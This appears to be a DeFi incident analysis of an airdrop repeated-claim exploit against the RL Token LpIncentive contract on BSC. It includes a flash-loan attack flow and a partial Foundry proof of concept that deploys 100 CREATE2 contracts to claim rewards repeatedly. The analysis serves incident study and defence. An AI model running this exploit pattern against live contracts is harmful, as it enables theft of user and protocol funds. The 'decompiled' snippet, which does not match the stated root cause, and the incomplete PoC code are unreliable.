# RL — CREATE2 Multi-Contract Airdrop Repeated Claim Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-10 |
| **Protocol** | RL Token (LpIncentive) |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Unconfirmed |
| **RL Token** | [0x4bBfae575Dd47BCFD5770AB4bC54Eb83DB088888](https://bscscan.com/address/0x4bBfae575Dd47BCFD5770AB4bC54Eb83DB088888) |
| **RL LP Incentive** | [0x335ddcE3f07b0bdaFc03F56c1b30D3b269366666](https://bscscan.com/address/0x335ddcE3f07b0bdaFc03F56c1b30D3b269366666) |
| **LP Pair** | [0xD9578d4009D9CC284B32D19fE58FfE5113c04A5e](https://bscscan.com/address/0xD9578d4009D9CC284B32D19fE58FfE5113c04A5e) |
| **DODO Protocol** | [0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE](https://bscscan.com/address/0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE) |
| **Attacker** | [0x08e08f4b701d33c253ad846868424c1f3c9a4db3](https://bscscan.com/address/0x08e08f4b701d33c253ad846868424c1f3c9a4db3) |
| **Attack Contract** | [0x5EfD021Ab403B5b6bBD30fd2E3C26f83f03163d4](https://bscscan.com/address/0x5EfD021Ab403B5b6bBD30fd2E3C26f83f03163d4) |
| **Root Cause** | `distributeAirdrop()` does not validate whether an address has already claimed the airdrop, allowing multiple contracts deployed via CREATE2 to claim repeatedly |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/RL_exp.sol) |

---
## 1. Vulnerability Overview

The `distributeAirdrop()` function of the RL LpIncentive contract was designed to airdrop RL tokens to LP token holders. However, it lacked any duplicate-claim prevention logic per address. The attacker flash-borrowed 450,000 USDT from DODO to acquire RL LP tokens, then deployed 100 `AirDropRewardContract` instances via CREATE2. LP tokens were distributed to each instance, and `airDropReward()` was called on each to repeatedly claim RL tokens. The attacker then removed liquidity and sold RL to realize profit.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable distributeAirdrop() - no duplicate claim prevention
contract RLLpIncentive {
    mapping(address => uint256) public lpBalance;

    function distributeAirdrop(address recipient) external {
        // ❌ Does not check whether recipient has already claimed the airdrop
        uint256 lpHeld = lpBalance[recipient];
        require(lpHeld > 0, "No LP");

        // ❌ Claim status is not recorded
        uint256 reward = lpHeld * REWARD_RATE;
        RL.transfer(recipient, reward);
        // The same lpBalance can be used to re-claim on the next call
    }
}

// ✅ Correct pattern - claim state tracking
contract SafeRLLpIncentive {
    mapping(address => bool) public airdropClaimed;

    function distributeAirdrop(address recipient) external {
        // ✅ Block addresses that have already claimed
        require(!airdropClaimed[recipient], "Already claimed");
        uint256 lpHeld = lpBalance[recipient];
        require(lpHeld > 0, "No LP");

        airdropClaimed[recipient] = true; // ✅ CEI pattern
        uint256 reward = lpHeld * REWARD_RATE;
        RL.transfer(recipient, reward);
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompilation


**AirdropMultiContractDrain_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: `distributeAirdrop()` does not validate whether an address has already claimed the airdrop, allowing multiple contracts deployed via CREATE2 to claim repeatedly
    function transferFrom(address arg0, address arg1, uint256 arg2) external {}  // 0x23b872dd  // ❌ Unauthorized transferFrom
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Flash loan 450,000 USDT from DODO
    │
    ├─[2] Swap USDT → RL + add liquidity → receive LP tokens
    │
    ├─[3] Deploy 100 AirDropRewardContracts via CREATE2
    │       Distribute LP tokens to each contract
    │
    ├─[4] Call airDropReward() on each contract
    │       ❌ No duplicate claim prevention per address
    │       100 contracts × airdrop = massive RL received
    │
    ├─[5] Remove liquidity (LP → USDT + RL)
    │
    ├─[6] Sell RL → USDT
    │
    ├─[7] Repay DODO flash loan
    │
    └─[8] Net profit: RL token arbitrage (amount unconfirmed)
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IRLLpIncentive {
    function distributeAirdrop(address recipient) external;
}

// Airdrop claim contract deployed via CREATE2
contract AirDropRewardContract {
    IRLLpIncentive incentive;
    address owner;

    constructor(address _incentive, address _lp) {
        incentive = IRLLpIncentive(_incentive);
        owner = msg.sender;
        // Claim airdrop after receiving LP tokens
    }

    function airDropReward() external {
        // Claim airdrop for this contract's own address
        incentive.distributeAirdrop(address(this));
        // Forward received RL to owner
    }
}

contract RLExploit is Test {
    IRLLpIncentive incentive = IRLLpIncentive(0x335ddcE3f07b0bdaFc03F56c1b30D3b269366666);

    function setUp() public {
        vm.createSelectFork("bsc", 21_794_289);
    }

    function testExploit() public {
        // [Step 1] DODO flash loan

        // [Step 2] Create LP

        // [Step 3] Deploy 100 contracts via CREATE2
        for (uint256 salt = 0; salt < 100; salt++) {
            bytes32 saltBytes = bytes32(salt);
            // CREATE2 deployment
            AirDropRewardContract sub = new AirDropRewardContract{salt: saltBytes}(
                address(incentive),
                address(lpToken)
            );
            // Distribute LP tokens
            lpToken.transfer(address(sub), lpPerContract);
            // ⚡ Claim airdrop - no duplicate prevention per address
            sub.airDropReward();
        }

        // [Step 4] Remove liquidity + sell RL
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Missing airdrop duplicate claim prevention + CREATE2 multi-address generation |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Airdrop/reward duplicate claiming |
| **Attack Vector** | 100 contracts via CREATE2 → `distributeAirdrop()` called 100 times |
| **Precondition** | No duplicate claim prevention in the airdrop function |
| **Impact** | Mass theft of RL tokens |

---
## 6. Remediation Recommendations

1. **Claim state mapping**: Track per-address claim history using `claimed[address] = bool` or `claimedAmount[address] = uint256`.
2. **Merkle proof-based airdrop**: Manage a predetermined recipient list as a Merkle tree, ensuring each address can only claim a fixed amount.
3. **Contract address restriction**: Prevent contracts from claiming airdrops on behalf of others using `require(msg.sender == tx.origin)` or a contract address blacklist.

---
## 7. Lessons Learned

- **CREATE2 multi-address attack**: By varying the salt, CREATE2 can generate an unlimited number of new addresses. Airdrop duplicate prevention must track not only EOA addresses but also contract addresses generated via CREATE2.
- **Airdrop attack surface**: Airdrops must precisely control "who, how much, and how many times" tokens can be claimed. If any one of these three controls is insufficient, it becomes an attack vector.